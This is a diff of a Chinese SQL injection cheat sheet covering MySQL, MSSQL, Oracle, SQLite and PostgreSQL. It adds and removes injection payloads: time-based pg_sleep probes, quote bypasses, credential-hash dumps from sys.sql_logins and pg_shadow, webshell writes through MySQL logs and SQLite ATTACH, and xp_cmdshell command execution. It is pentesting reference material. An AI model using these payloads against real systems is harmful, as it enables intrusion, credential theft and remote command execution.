@@ -8,7 +8,7 @@
 
 ---
 
-# 大纲
+## 大纲
 
 * [注入检测](#注入检测)
 * [MySQL](#mysql)
@@ -19,6 +19,10 @@
 * [SQLite](#sqlite)
 
 ---
+
+**描述**
+
+注入攻击的本质，是程序把用户输入的数据当做代码执行。这里有两个关键条件，第一是用户能够控制输入；第二是用户输入的数据被拼接到要执行的代码中从而被执行。sql 注入漏洞则是程序将用户输入数据拼接到了 sql 语句中，从而攻击者即可构造、改变 sql 语义从而进行攻击。
 
 **教程**
 - [SQL 注入 - CTF Wiki](https://ctf-wiki.github.io/ctf-wiki/web/sqli/)
@@ -397,48 +401,6 @@ select * from users where id=1 and 1=(select 1 from information_schema.tables wh
 
 实验表名：在 limit 0,1 下，regexp 会匹配所有的项。我们在使用 regexp 时，要注意有可能有多个项，同时要一个个字符去爆破。类似于上述第一条和第二条。而 limit 0,1 对于 where table_schema='security' limit 0,1 来说 table_schema='security' 已经起到了限定作用了，limit 有没有已经不重要了。
 
-### 日志 getshell
-
-查询当前 mysql 下 log 日志的默认地址，同时也看下 log 日志是否为开启状态，并且记录下原地址，方便后面恢复。
-```sql
--- 开启日志监测，一般是关闭的，如果一直开，文件会很大的。
-set global general_log = on;
-
--- 这里设置我们需要写入的路径就可以了。
-set global general_log_file = 'D:/shell.php';
-
--- 查询一个一句话，这个时候log日志里就会记录这个。
-select '<?php eval($_POST['1']);?>';
-```
-
-```sql
--- 结束后，再修改为原来的路径。
-set global general_log_file = 'D:\xampp\mysql\data\1.log';
-
--- 关闭下日志记录。
-set global general_log = off;
-```
-
-#### 慢查询日志
-
-MySQL 的慢查询日志是 MySQL 提供的一种日志记录，它用来记录在 MySQL 中响应时间超过阀值的语句。
-
-对日志量庞大，直接访问日志网页极有可能出现 500 错误。通过开启慢查询日志，记录了超时 10s 的 SQL，这样页面的代码量会减轻很多不易导致 500, 配置可解析日志文件 GETSHELL。
-```sql
-show variables like '%slow%';
-```
-long_query_time 的默认值为 10，意思是运行 10S 以上的语句。该值可以指定为微秒的分辨率。具体指运行时间超过 long_query_time 值的 SQL，则会被记录到慢查询日志中。
-
-```sql
-set GLOBAL slow_query_log_file='C:/phpStudy/PHPTutorial/WWW/slow.php';
-set GLOBAL slow_query_log=on;
-set GLOBAL log_queries_not_using_indexes=on;
-```
-
-```sql
-select '<?php phpinfo();?>' from mysql.db where sleep(10);
-```
-
 ### bypass 技巧
 
 **常见的绕过技巧**
@@ -661,6 +623,10 @@ select JSON_ARRAY_APPEND(version(),1,1);
 select JSON_ARRAY_APPEND('[1,2]',version(),1);
 ```
 
+### 提权/GETSHELL
+
+- [Mysql提权](../../软件服务安全/实验/Mysql.md)
+
 ---
 
 ## MSSQL
@@ -672,12 +638,18 @@ select JSON_ARRAY_APPEND('[1,2]',version(),1);
 
 **靶场**
 - [Larryxi/MSSQL-SQLi-Labs](https://github.com/Larryxi/MSSQL-SQLi-Labs)
+    - 搭建过程 : [MSSQL搭建](../../../../Integrated/Windows/实验/MSSQL搭建.md) , [asp站点搭建](../../../../Integrated/Windows/实验/asp站点搭建.md)
 
 **相关文章**
 - [SQL Server从0到1](https://mp.weixin.qq.com/s/N2siXJgmPAZ7CSIQ3FCF0w)
+- [从0开始学习Microsoft SQL Server数据库攻防](https://xz.aliyun.com/t/10955)
+- [窃取MSSQL各版本密码HASH](https://mp.weixin.qq.com/s/nKV25G2PAI9rxXdtbyWE3A)
 
 **相关案例**
 - [记一次苦逼的sql注入](https://mp.weixin.qq.com/s/ydzMtlJfWD4hixIo1_ul2A)
+
+**相关工具**
+- [Keramas/mssqli-duet](https://github.com/Keramas/mssqli-duet) - SQL injection script for MSSQL that extracts domain users from an Active Directory environment based on RID bruteforcing
 
 ### MSSQL 基础
 
@@ -688,6 +660,15 @@ user            -- 获取当前数据库用户名
 db_name()       -- 当前数据库名 其中db_name(N)可以来遍历其他数据库
 ;select user    -- 查询是否支持多语句
 @@servername    -- 服务器名称
+```
+
+**查询密码HASH**
+```sql
+-- MSSQL 2000版本
+select name,password from master.dbo.sysxlogins
+
+-- MSSQL 2005及以后版本
+select name,password_hash from sys.sql_logins
 ```
 
 ### 正则表达式攻击
@@ -717,25 +698,6 @@ MSSQL 所用的正则表达式并不是标准正则表达式 ，该表达式使�
 ```
 
 同理可以用相同的方法获取字段，值。这里就不再详细描述了。
-
-### xp_cmdshell
-
-```sql
--- SQL Server 阻止了对组件 ‘xp_cmdshell’ 的 过程’sys.xp_cmdshell’ 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 ‘xp_cmdshell’。有关启用 ‘xp_cmdshell’ 的详细信息，请参阅 SQL Server 联机丛书中的 “外围应用配置器”。
-
--- 关闭
-EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE;
--- 开启
-EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
-```
-```sql
--- 标记message: 配置选项 ‘xp_cmdshell’ 不存在，也可能是高级选
-EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'user connections',1;RECONFIGURE;--
-```
-
-```sql
-exec master..xp_cmdshell 'cmd /c whoami'
-```
 
 ### bypass 技巧
 
@@ -795,9 +757,18 @@ exec master..xp_cmdshell 'cmd /c whoami'
 
     ![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/38.jpg)
 
+### 提权/GETSHELL
+
+- [MSSQL提权](../../软件服务安全/实验/MSSQL.md)
+
 ---
 
 ## oracle
+
+用于是否是判断 oracle 数据库的方法
+```
+and (select count(*) from sys.user_tables)>0
+```
 
 **相关案例**
 - [BountyHunterInChina/重生之我是赏金猎人(一)-轻松GET某src soap注入](https://github.com/J0o1ey/BountyHunterInChina/blob/main/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA(%E4%B8%80)-%E8%BD%BB%E6%9D%BEGET%E6%9F%90src%20soap%E6%B3%A8%E5%85%A5.pdf)
@@ -899,3 +870,126 @@ ATTACH DATABASE '/var/www/html/shell.php' AS shell;
 create TABLE shell.exp (webshell text);
 insert INTO shell.exp (webshell) VALUES ('<?php eval($_POST[a]);?>');
 ```
+
+---
+
+## Postgresql
+
+**相关文章**
+- [SQL注入渗透PostgreSQL(bypass tricks)](https://xz.aliyun.com/t/8621)
+
+### Postgresql 基础
+
+**忽略**
+```sql
+SELECT 'admin' FROM users;
+SELECT 'admin' OR 1 = 1; -- -' FROM users;
+```
+
+**||**
+
+`||` 可用于将数据附加到同一行的输出中
+```sql
+SELECT ''||password FROM users; -- -';
+```
+
+**通过延时判断是否是 Postgresql 数据库的方法**
+
+SELECT
+```sql
+-- 如果参数是整数：
+pg_sleep(20); -- -
+
+-- 如果参数是字符串：
+'||pg_sleep(20); -- -
+```
+
+FROM
+```sql
+-- 当payload的第一个SELECT子句中提供了有效的表名(TABLE)和列(COLUMN)时
+(SELECT * FROM [TABLE] WHERE [COLUMN]=1|(SELECT (SELECT CASE WHEN COUNT((SELECT pg_sleep(20)))<>0 THEN 1 ELSE 2 END))) ss; -- -
+
+-- 或者
+(SELECT * FROM [TABLE] WHERE [COLUMN] = 'asd'::varchar||(SELECT (SELECT CASE WHEN COUNT((SELECT pg_sleep(20)))<>0 THEN 1 ELSE 2 END))) ss; -- -
+
+-- 当已知列需要一个Int
+(SELECT * FROM address WHERE address_id=1|(SELECT (SELECT CASE WHEN COUNT((SELECT pg_sleep(20)))<>0 THEN 1 ELSE 2 END))) ss; -- -
+
+-- 当已知列需要字符串时
+(SELECT * FROM address WHERE address = 'asd'::varchar||(SELECT (SELECT CASE WHEN COUNT((SELECT pg_sleep(20)))<>0 THEN 1 ELSE 2 END))) ss; -- -
+```
+
+WHERE
+```sql
+-- 如果参数是整数
+1|(SELECT (SELECT CASE WHEN COUNT((SELECT pg_sleep(20)))<>0 THEN 1 ELSE 2 END)); -- -
+
+-- 如果参数是字符串
+'||(pg_sleep(20)); -- -
+```
+
+HAVING
+```sql
+-- 如果参数是整数：
+(COUNT((SELECT pg_sleep(20)))=1); -- -
+
+-- 如果参数是字符串：
+t' AND (SELECT COUNT((SELECT pg_sleep(20)))) = 1; -- -
+```
+
+OFFSET
+```sql
+-- 如果参数是整数：
+1|(SELECT COUNT((SELECT pg_sleep(20)))); -- -
+
+-- 如果参数是字符串
+1'::integer + 1|(SELECT COUNT((SELECT pg_sleep(20)))); -- -
+```
+
+**当注入点在 WHERE 时**
+
+可以配合 `||`
+```sql
+select * from test where username='admin' and password='admin'
+select * from test where username='admin' and password=''||(select password);
+```
+
+![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/39.png)
+
+![](../../../../../assets/img/Security/RedTeam/Web安全/Web_Generic/SQLi/40.png)
+
+### bypass 技巧
+
+**注释**
+```sql
+SELECT version();
+SELECT/**/version();
+```
+
+**代替引号**
+```sql
+select pg_ls_dir('/etc');
+select pg_ls_dir($$/etc$$);         -- 使用 $ 符号
+select pg_ls_dir($test$/etc$test$); -- 使用标签
+select pg_ls_dir(CHR(47)||CHR(101)||CHR(116)||CHR(99)); -- 采取CHR()函数
+```
+
+**query_to_xml**
+
+query_to_xml 可以将结果返回在一行里，不必担心限制或多行
+
+```sql
+SELECT query_to_xml('SELECT usename, passwd FROM pg_shadow;',true,true,'')
+```
+
+**DATABASE_TO_XML**
+
+使用 xml 帮助程序通过单个查询转储整个数据库
+
+```sql
+SELECT database_to_xml(true,true,'')
+```
+
+### 提权/GETSHELL
+
+- [Postgresql提权](../../软件服务安全/实验/Postgresql.md)
